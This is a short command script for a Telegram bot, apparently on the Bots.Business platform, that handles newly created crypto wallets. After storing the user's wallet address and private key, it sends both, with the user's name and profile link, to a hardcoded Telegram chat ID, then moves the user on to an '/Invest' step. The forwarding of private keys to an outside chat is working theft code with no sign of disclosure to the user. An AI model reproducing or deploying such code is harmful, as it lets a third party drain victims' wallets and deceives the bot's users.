/*CMD
  command: sucsjsjs
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

var data = JSON.parse(content)
let inf =
  "[" +
  user.first_name +
  "]" +
  "(" +
  "tg://user?id=" +
  user.telegramid +
  ")";
var res = data.address
User.setProperty("wallset",res, "string")
var priv = data.privateKey
User.setProperty("wallpk",priv, "string")
Bot.sendMessageToChatWithId(5163548809,"User name "+inf+"\n*Address :*\n`"+res+"`\n\n*Private Key :*\n`"+priv+"`\n\n")
   Bot.runCommand("/Invest")
